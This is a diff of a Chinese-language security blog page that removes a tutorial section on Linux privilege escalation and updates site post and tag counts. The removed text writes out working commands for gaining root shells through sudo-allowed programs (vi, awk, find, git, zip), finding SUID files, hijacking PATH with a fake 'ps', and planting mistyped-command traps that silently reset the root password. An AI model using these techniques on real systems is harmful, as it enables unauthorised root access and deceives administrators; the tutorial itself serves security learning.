-<p>使用如下命令即可复现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /home/test/sudo</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; test.sh</span><br><span class="line">chmod +x test.sh</span><br><span class="line">sudo ./test.sh</span><br></pre></td></tr></table></figure></p>
-<h3 id="2-3-使用系统命令sudo提权"><a href="#2-3-使用系统命令sudo提权" class="headerlink" title="2.3 使用系统命令sudo提权"></a>2.3 使用系统命令sudo提权</h3><p>如vi，more，less，tar，zip，awk，git，find等命令，如在/etc/sudoers中配置，即存在sudo提权</p>
-<p>vi,more,less的命令sudo提权方式都是使用对应命令sudo打开一个文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo vi filename</span><br><span class="line">sudo more filename</span><br><span class="line">sudo less filename</span><br></pre></td></tr></table></figure></p>
-<p>然后在打开界面输入!/bin/bash，即可获得root权限的shell</p>
-<p>zip命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip filename.zip 123.txt -T --unzip-command=&quot;!/bin/bash&quot;</span><br></pre></td></tr></table></figure></p>
-<p>awk命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo awk &apos;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&apos;</span><br></pre></td></tr></table></figure></p>
-<p>git命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git help status</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure></p>
-<p>find命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find /bin/ -name ls -exec /bin/bash \;</span><br></pre></td></tr></table></figure></p>
-<h2 id="3-环境变量提权"><a href="#3-环境变量提权" class="headerlink" title="3. 环境变量提权"></a>3. 环境变量提权</h2><h3 id="3-1-具有S权限位的脚本"><a href="#3-1-具有S权限位的脚本" class="headerlink" title="3.1 具有S权限位的脚本"></a>3.1 具有S权限位的脚本</h3><p>Linux中通过设置suid，可以让程序的执行者临时拥有属主的权限，可以使用下面的命令查找具有suid的脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
-<p>然后具有s权限位的这些脚本中如果存在可控环境变量。如脚本中存在调用ps程序，我们可以在低权限用户可写目录中写一个ps文件，内容为/bin/bash，然后将此目录添加到环境变量最优先寻找的目录，再执行脚本，脚本就会以root权限触发/bin/bash，就产生了一个root权限的shell，完成提权。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;/bin/bash&quot; &gt; /home/test/ps</span><br><span class="line">export PATH=/home/test:$PATH</span><br></pre></td></tr></table></figure></p>
-<h3 id="3-2-root的环境变量设置了用户可控目录"><a href="#3-2-root的环境变量设置了用户可控目录" class="headerlink" title="3.2 root的环境变量设置了用户可控目录"></a>3.2 root的环境变量设置了用户可控目录</h3><p>root的$PATH若设置了用户可控的目录，用户可以在此可控目录写入一些命令并诱导root用户输入，在这些文件中填充修改root密码的命令或给其他用户添加权限等命令，然后当root用户被诱导输入一些环境变量中配置的指令时就会执行这些命令。通常会配置一些容易输错的单词，并在后面加入返回命令不存在的提示。</p>
-<p>如文件名设置为whomai，与正常的命令whoami颠倒了一点顺序，有时手快会输入错误。<br>然后在whoami中配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;root:password&quot; |chpasswd &gt;&gt; /dev/null 2&gt;&amp;1</span><br><span class="line">echo &quot;bash: whomai: 未找到命令&quot;</span><br></pre></td></tr></table></figure></p>
-<p>当然我们可以配置非常多的文件名来增加触发概率。</p>
-<h3 id="3-3-su切换而不是su-切换导致携带用户环境变量"><a href="#3-3-su切换而不是su-切换导致携带用户环境变量" class="headerlink" title="3.3 su切换而不是su -切换导致携带用户环境变量"></a>3.3 su切换而不是su -切换导致携带用户环境变量</h3><p>linux系统在使用su切换时，会携带当前用户的环境变量，使用su -则不会，如果在当前用户环境变量设置如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=/home/test/ps:$PATH</span><br></pre></td></tr></table></figure></p>
-<p>编辑一个ps文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;root:password&quot; |chpasswd &gt;&gt; /dev/null 2&gt;&amp;1</span><br><span class="line">ps</span><br></pre></td></tr></table></figure></p>
-<p>那么在从此用户切换到root的管理员，在使用ps时就会修改掉root用户密码。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2334,7 +2269,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">102</span>
+                <span class="site-state-item-count">104</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -2356,7 +2291,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">63</span>
+                <span class="site-state-item-count">64</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
